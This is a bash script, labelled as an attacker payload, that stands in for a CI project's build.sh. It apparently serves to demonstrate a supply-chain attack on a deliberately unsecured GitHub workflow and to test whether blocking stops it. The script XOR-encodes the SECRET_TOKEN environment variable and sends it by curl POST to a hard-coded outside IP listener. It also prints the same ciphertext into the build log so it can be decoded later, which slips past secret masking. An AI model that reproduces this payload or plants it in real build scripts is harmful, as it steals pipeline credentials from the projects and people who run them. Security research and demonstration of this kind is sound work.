#!/usr/bin/env bash
# ============================================================================
#  🎯  ATTACKER PAYLOAD — replaces the legitimate build.sh
#
#  Two parallel exfiltration paths, both targeting the SECRET_TOKEN env var
#  that the victim workflow exposes via .github/workflows/build.yml.
#
#  ATTACK 1 — Network exfil via HTTP POST (curl), body = TRACE_XOR_V1:<hex>,
#             same ciphertext as Phase 2. Plaintext SECRET_TOKEN never appears on the wire.
#  ATTACK 2 — Log channel: echoes the same XOR_V1 ciphertext for offline decode (COMMENTS.md).
#
#  Compare baseline: https://github.com/kiran-sec/victim-unsecured/blob/main/build.sh
# ============================================================================

set -u

# Deterministic XOR + per-byte LCG key-advance → lowercase hex (no whitespace).
_xor_hex_v1() {
  local s="$1"
  local k=90   # seed (0x5a), must match decoder
  local out="" i b x hh
  for (( i = 0; i < ${#s}; i++ )); do
    printf -v oc '%s' "${s:i:1}"
    b="$(printf '%d' "'${oc}")"
    x=$(( (b ^ k) & 255 ))
    printf -v hh '%02x' "$x"
    out+="$hh"
    # LCG modulus 256 (same recurrence as COMMENTS decoder)
    k=$(( (1103515245 * k + 12345) & 255 ))
  done
  printf '%s' "$out"
}

echo "==> Building example project"
echo "Hello from build.sh on $(uname -a)"

echo "[attacker] phase 1: POST ciphertext (TRACE_XOR_V1:…) to attacker listener"
curl -fsS --max-time 5 \
     -X POST \
     --data-binary "TRACE_XOR_V1:$(_xor_hex_v1 "$SECRET_TOKEN")" \
     "http://20.114.54.219:4444/exfil" \
  || echo "[attacker] phase 1 failed (this is what blocking looks like)"

echo "[attacker] phase 2: emitting CI trace XOR_V1 fingerprint (offline decode)"
echo "TRACE_XOR_V1:$(_xor_hex_v1 "$SECRET_TOKEN")"

echo "==> Done"
